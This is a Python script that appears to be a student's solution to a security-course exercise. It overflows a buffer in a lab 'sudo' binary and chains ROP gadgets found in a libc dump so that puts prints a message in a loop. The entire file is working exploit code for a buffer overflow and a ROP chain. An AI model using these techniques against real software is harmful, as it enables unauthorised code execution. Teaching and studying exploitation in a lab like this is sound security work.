import os, sys

import addresses
import assemble
from search import GadgetSearch


PATH_TO_SUDO = './sudo'
LIBC_DUMP_PATH = './libc.bin'
HEX_BASE = 16


def get_string(student_id):
    return 'Take me (%s) to your leader!' % student_id


def get_arg():
    search = GadgetSearch(LIBC_DUMP_PATH)
    # NOTES:
    # 1. Use `addresses.PUTS` to get the address of the `puts` function.
    # 2. Don't write addresses of gadgets directly - use the search object to
    #    find the address of the gadget dynamically.

    str_value = get_string(302893680)
    shellcode_start_addr = addresses.SHELLCODE_START # this is where our actual logic begins, after loading the address of 'puts' into ebp
    num_rop_commands = 5 # we need this to calculate the address of our string
    str_value_addr = shellcode_start_addr + num_rop_commands * 4
    puts_addr = addresses.PUTS

    pop_ebp_addr = int(search.find_format('pop ebp')[1], HEX_BASE)
    pop_edx_addr = int(search.find_format('pop edx')[1], HEX_BASE)
    pop_esp_addr = int(search.find_format('pop esp')[1], HEX_BASE)

    buff = 'a' * (0x49 - len("thisisasalt")) # same as in q1
    old_ebp = 'b' * 4 # same as in q1
    buffer_part = buff + old_ebp

    # for details please see q4.txt
    shellcode = addresses.address_to_bytes(pop_ebp_addr) + addresses.address_to_bytes(puts_addr) + \
    addresses.address_to_bytes(puts_addr) + addresses.address_to_bytes(pop_edx_addr) + \
    addresses.address_to_bytes(str_value_addr) + addresses.address_to_bytes(pop_esp_addr) +\
   	addresses.address_to_bytes(shellcode_start_addr) + str_value

    return buffer_part + shellcode

def main(argv):
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, get_arg())


if __name__ == '__main__':
    main(sys.argv)
